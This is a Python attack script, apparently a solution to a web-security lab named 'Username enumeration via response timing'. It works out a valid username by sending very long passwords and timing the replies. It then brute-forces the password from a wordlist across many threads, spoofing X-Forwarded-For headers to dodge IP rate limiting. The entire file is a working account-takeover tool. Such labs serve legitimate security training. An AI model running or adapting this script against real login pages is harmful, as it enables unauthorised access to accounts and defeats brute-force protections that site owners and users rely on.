import threading
import requests
import sys
import getopt
from halo import Halo
import signal


def get_username(url, session):
  number = 0
  usernames = open("./usernames.txt", "r")
  password = "a" * 2000
  threads = []
  # Dictionary with info like "username":"response time"
  info_responses = {}

  def test_usernames(username, number):
    username = username.strip()
    data = {'username': username, 'password':  password}
    headers = {'X-Forwarded-For': str(number)}
    response = session.post(url, headers=headers, data=data)
    response_time = response.elapsed.total_seconds()
    info_responses[username]=response_time

  for username in usernames:
    t = threading.Thread(target=test_usernames, args=(username, number))
    threads.append(t)
    number += 1

  for x in threads:
    x.start() 

  for x in threads:
    x.join()

  # Get username with the largest response time
  valid_username = max(info_responses, key=info_responses.get)
  usernames.close()
  return valid_username


def get_password(url, session, valid_username):
  number = 101
  passwords = open("./passwords.txt", "r")
  valid_password = []
  threads = []

  def test_passwords(password, number):
    password = password.strip()
    data = {'username': valid_username, 'password':  password}
    headers = {'X-Forwarded-For': str(number)}
    response = session.post(url, headers=headers, data=data)

    if "Invalid username or password." not in response.text:
      valid_password.append(password)

  for password in passwords:
    t = threading.Thread(target=test_passwords, args=(password, number))
    threads.append(t)
    number += 1

  for x in threads:
    x.start() 

  for x in threads:
    x.join()
  
  return valid_password[0]


def main(argv):
  help_message = "This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h", end="") # Make cursor visible
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h", end="") # Make cursor visible
      sys.exit()

  session = requests.Session()

  # Create and start spinner animation
  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
  spinner.start()
  # Get valid username
  username = get_username(url, session)
  # Finish spinner
  spinner.succeed(f"The username is: \"{username}\"")

  # Create and start spinner animation
  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
  spinner.start()
  # Get valid password
  password = get_password(url, session, username)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()